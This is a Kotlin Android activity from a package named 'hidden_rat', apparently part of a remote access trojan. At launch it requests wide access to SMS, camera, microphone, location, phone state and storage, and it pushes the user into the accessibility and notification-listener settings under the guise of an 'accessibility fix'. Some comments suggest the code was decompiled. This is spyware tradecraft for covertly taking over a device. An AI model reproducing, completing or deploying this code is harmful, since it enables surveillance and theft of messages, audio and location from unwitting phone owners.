package com.ratx.hidden_rat.activity

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.ratx.hidden_rat.R
import com.ratx.hidden_rat.service.SvcAccFix


class AccessibilityFixActivity : AppCompatActivity() {
    private val REQUEST_CODE_NOTIFICATION_LISTENER = 10
    private val PERMISSION_REQUEST_CODE = 123
    @SuppressLint("InlinedApi")
    private val permissions = arrayOf(
        Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.UPDATE_PACKAGES_WITHOUT_USER_ACTION,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.MODIFY_PHONE_STATE,
        Manifest.permission.MODIFY_AUDIO_SETTINGS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.CONTROL_LOCATION_UPDATES,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.BROADCAST_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.CAMERA,  // CAMERA huquqnamasini qo'shing
        Manifest.permission.CAPTURE_AUDIO_OUTPUT,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    )

    private fun openSetting() {
        try {
            SvcAccFix.j = true
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            startActivityForResult(intent, REQUEST_CODE_NOTIFICATION_LISTENER)
            startActivity(Intent("android.settings.ACCESSIBILITY_SETTINGS"))
        } catch (e: Exception) {
            Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
        }
    }

    override fun onBackPressed() {
        finishAffinity()
        super.onBackPressed()
    }

    public override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        if (SvcAccFix.i) {
            SvcAccFix.j = false
            Toast.makeText(this, getString(R.string.type_something), Toast.LENGTH_LONG).show()
            finish()
            return
        }
        setContentView(R.layout.activity_accessibility)
        checkAndRequestPermissions()
        checkNotificationListenerPermission()
        findViewById<View>(R.id.btn501925).setOnClickListener { view ->
            openSetting()
        }
    }

    private fun checkAndRequestPermissions() {
        val notGrantedPermissions = ArrayList<String>()

        for (permission in permissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                != PackageManager.PERMISSION_GRANTED
            ) {
                notGrantedPermissions.add(permission)
            }
        }

        if (notGrantedPermissions.isNotEmpty()) {
            // Request permissions
            ActivityCompat.requestPermissions(
                this,
                notGrantedPermissions.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        } else {
            startYourService()
        }
    }

    private fun checkNotificationListenerPermission() {
        if (!isNotificationListenerEnabled()) {
            requestNotificationListenerPermission()
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val packageName = packageName
        val flat = android.provider.Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        return flat != null && flat.contains(packageName)
    }

    private fun requestNotificationListenerPermission() {
        val enableNotificationListenerIntent = Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS)
        enableNotificationListenerIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(enableNotificationListenerIntent)
        Toast.makeText(this, "Please enable Notification Listener permission", Toast.LENGTH_LONG)
            .show()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQUEST_CODE_NOTIFICATION_LISTENER) {
            if (isNotificationListenerEnabled()) {
            } else {
            }
        }
    }


    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    // All permissions granted, proceed with audio recording
                } else {
                    // Permission denied, inform the user and ask to enable from settings
                }
            }
        }
    }


    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        val uri = Uri.fromParts("package", packageName, null)
        intent.data = uri
        startActivityForResult(intent, PERMISSION_REQUEST_CODE)
    }

    private fun startYourService() {
        //Nothing
    }   /* Access modifiers changed, original: protected */

    public override fun onDestroy() {
        super.onDestroy()
    }

    /* Access modifiers changed, original: protected */
    public override fun onResume() {
        super.onResume()
    }
}